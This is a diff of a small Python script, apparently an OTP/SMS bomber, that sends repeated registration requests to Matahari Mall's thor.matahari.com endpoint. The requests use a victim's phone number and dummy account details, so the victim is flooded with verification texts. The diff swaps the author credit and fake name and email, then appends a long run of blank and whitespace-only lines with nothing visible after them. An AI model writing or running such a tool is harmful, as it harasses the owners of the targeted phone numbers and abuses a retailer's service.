@@ -2,7 +2,7 @@ import requests,time
 
 print("""
 	[ MATAHARI MALL OTP ]
-	   -Asecx | winner-
+	   -Asecx | MR W1NN3R-
 """)
 
 no = input('ex : 08xx\n[In] Phone: ')
@@ -23,9 +23,9 @@ heder = {'Host': 'thor.matahari.com',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'}
 
-data = {'emailAddress': 'winner@mail.com',
-           'firstName': 'winner',
-           'lastName': 'mrwin',
+data = {'emailAddress': 'noobie@mail.com',
+           'firstName': 'Noobie',
+           'lastName': 'Gans',
            'mobileNumber': no,
            'mccCardNumber': '',
            'password': 'asecc123',
@@ -42,3 +42,46 @@ for i in range(jml):
       else:
            print(f'{i+1}. Berhasil {no}')
       time.sleep(1.5)
+
+
+
+
+
+
+
+
+
+
+           
+          
+          
+           
+           
+         
+           
+           
+        
+           
+           
+          
+           
+
+
+     
+          
+        
+        
+          
+
+  
+ 
+
+
+
+
+
+
+
+
+
+
